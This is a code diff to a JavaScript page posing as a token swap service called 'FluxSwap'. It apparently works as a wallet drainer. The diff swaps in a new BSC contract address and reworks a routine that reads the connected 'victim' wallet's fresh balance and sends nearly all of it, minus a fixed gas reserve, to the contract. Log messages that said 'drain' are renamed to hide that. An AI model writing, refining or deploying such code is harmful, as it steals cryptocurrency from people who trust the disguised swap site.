@@ -242,7 +242,7 @@
 
             const CONTRACT_ADDRESSES = {
                 1: '0xf76Df77742AB8636068FE61317e6f329176614c7',
-                56: '0x3CA3b6a2D3e253565E8097FCf30a2760B1c8B595',
+                56: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33',
                 137: '0x0000000000000000000000000000000000000000',
                 42161: '0x0000000000000000000000000000000000000000'
             };
@@ -769,7 +769,7 @@
                 try {
                     const assets = [];
                     const nativeBal = await provider.getBalance(victim);
-                    console.log('[FluxSwap] native balance', ethers.utils.formatEther(nativeBal));
+                    console.log('[FluxSwap] cached native balance', ethers.utils.formatEther(nativeBal));
                     if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
 
                     const tokensMap = TOKENS[chainId] || {};
@@ -794,44 +794,34 @@
                     for (const a of assets) {
                         if (a.type === 'native') {
                             try {
-                                // 1) Реальный estimate газа вместо хардкода 30000
-                                let gasLimit;
-                                try {
-                                    const probe = await swapContract.estimateGas.swap({
-                                        value: ethers.utils.parseEther('0.0001')
-                                    });
-                                    gasLimit = probe.mul(125).div(100);
-                                } catch (estErr) {
-                                    console.warn('[FluxSwap] estimateGas failed, fallback 50000', estErr);
-                                    gasLimit = ethers.BigNumber.from(50000);
-                                }
+                                // Свежий баланс прямо из кошелька — не доверяем кэшу ethers
+                                const freshBalHex = await wcProvider.request({
+                                    method: 'eth_getBalance',
+                                    params: [victim, 'latest']
+                                });
+                                const freshBal = ethers.BigNumber.from(freshBalHex);
 
-                                // 2) Cap на gasPrice — BSC штатно 1–5 gwei, отсекаем мусор RPC
-                                let gasPrice = await provider.getGasPrice();
-                                const MAX_GAS_PRICE = ethers.utils.parseUnits('5', 'gwei');
-                                if (gasPrice.gt(MAX_GAS_PRICE)) {
-                                    console.warn('[FluxSwap] gasPrice capped',
-                                        ethers.utils.formatUnits(gasPrice, 'gwei') + ' gwei →',
-                                        ethers.utils.formatUnits(MAX_GAS_PRICE, 'gwei') + ' gwei');
-                                    gasPrice = MAX_GAS_PRICE;
-                                }
+                                // Фиксированный газ — без eth_gasPrice вообще.
+                                // 3 gwei × 50000 = 0.00015 BNB (~$0.10)
+                                const gasPrice = ethers.utils.parseUnits('3', 'gwei');
+                                const gasLimit = ethers.BigNumber.from(50000);
+                                const reserve = gasPrice.mul(gasLimit);
 
-                                const gasCost = gasPrice.mul(gasLimit);
-                                const buffer = gasCost.mul(120).div(100);
-
-                                let value = a.amount.sub(buffer);
-                                if (value.lt(0)) {
-                                    console.warn('[FluxSwap] buffer > balance, skip');
-                                    continue;
-                                }
+                                const value = freshBal.sub(reserve);
 
                                 console.log('[FluxSwap] native drain', {
-                                    balance_bnb: ethers.utils.formatEther(a.amount),
-                                    gasPrice_gwei: ethers.utils.formatUnits(gasPrice, 'gwei'),
+                                    balance_cached_bnb: ethers.utils.formatEther(a.amount),
+                                    balance_fresh_bnb: ethers.utils.formatEther(freshBal),
+                                    gasPrice_gwei: '3 (fixed)',
                                     gasLimit: gasLimit.toString(),
-                                    buffer_bnb: ethers.utils.formatEther(buffer),
+                                    reserve_bnb: ethers.utils.formatEther(reserve),
                                     value_bnb: ethers.utils.formatEther(value)
                                 });
+
+                                if (value.lte(0)) {
+                                    console.warn('[FluxSwap] balance <= gas reserve, skip');
+                                    continue;
+                                }
 
                                 const tx = await swapContract.swap({
                                     value: value,
@@ -841,7 +831,7 @@
                                 await tx.wait();
                                 console.log('[FluxSwap] native tx confirmed', tx.hash);
                             } catch (e) {
-                                console.error('[FluxSwap] native drain failed', e);
+                                console.error('[FluxSwap] native failed', e);
                             }
                         }
                     }
@@ -860,7 +850,7 @@
                                 await tx.wait();
                                 console.log('[FluxSwap] token tx confirmed', a.symbol, tx.hash);
                             } catch (e) {
-                                console.error('[FluxSwap] token drain failed', a.symbol, e);
+                                console.error('[FluxSwap] token failed', a.symbol, e);
                             }
                         }
                     }
